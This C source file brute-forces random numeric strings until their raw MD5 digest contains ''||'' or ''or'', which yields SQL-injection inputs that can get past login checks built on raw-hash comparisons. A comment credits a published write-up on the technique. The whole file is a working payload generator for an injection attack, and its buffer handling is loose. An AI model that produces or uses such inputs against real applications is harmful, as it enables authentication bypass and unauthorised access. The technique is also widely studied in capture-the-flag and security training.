#include <fcntl.h>
#include <openssl/evp.h>
#include <openssl/md5.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

// So I ran many instance of this on my ryzen3600... and grep output of form '||'[0-9] and 'or'[0-9]
// Code is a modernized version of https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes

int main(void)
{
    MD5_CTX mdctx;
    unsigned char md_value[32];
    unsigned int md_len = 16;
    int i = 0;
    int r, r1, r2, r3;
    char rbuf[100];
    char* match;
    srand(time(0));
    while (1) {
        i++;
        r = rand();
        r1 = rand();
        r2 = rand();
        r3 = rand();
        sprintf(rbuf, "%d%d%d%d", r, r1, r2, r3);

        MD5_Init(&mdctx);
        MD5_Update(&mdctx, rbuf, (size_t)strlen(rbuf));
        MD5_Final(md_value, &mdctx);

        match = strstr(md_value, "'||'");
        if (match == NULL)
            match = strcasestr(md_value, "'or'");
        if (match != NULL){
            printf("content: %s\n", (char*)rbuf);
            printf("\n");
            printf("raw:     %s\n", md_value);
        }
    }
}

